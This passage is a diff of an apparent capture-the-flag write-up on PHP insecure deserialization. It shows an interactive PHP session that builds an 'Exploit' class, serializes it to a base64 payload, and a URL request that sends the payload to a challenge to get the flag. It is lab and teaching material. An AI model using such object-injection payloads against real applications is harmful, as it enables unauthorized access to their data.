@@ -125,23 +125,22 @@ class Test{
 
 #### 3. Cool way:
 
-$ php -a
-Interactive mode enabled
+- $ php -a
+- Interactive mode enabled
 
-php > class Exploit
-php > {
-php {	function __destruct ()
-php {	{
-php {		var_dump ($flag);
-php {	}
-php { }
-php > echo base64_encode (serialize (new Exploit ()));
-PHP Notice:  Undefined variable: flag in php shell code on line 5
-NULL
-Tzo3OiJFeHBsb2l0IjowOnt9
-php >
+- php > class Exploit
+- php > {
+- php {	function __destruct ()
+- php {	{
+- php {		var_dump ($flag);
+- php {	}
+- php { }
+- php > echo base64_encode (serialize (new Exploit ()));
+- PHP Notice:  Undefined variable: flag in php shell code on line 5
+- NULL
+- Tzo3OiJFeHBsb2l0IjowOnt9
 
-When we request /?input=Tzo3OiJFeHBsb2l0IjowOnt9, we get the flag:
+- When we request /?input=Tzo3OiJFeHBsb2l0IjowOnt9, we get the flag:
 
 
 #### 4.Just create a object, NULL is cool:
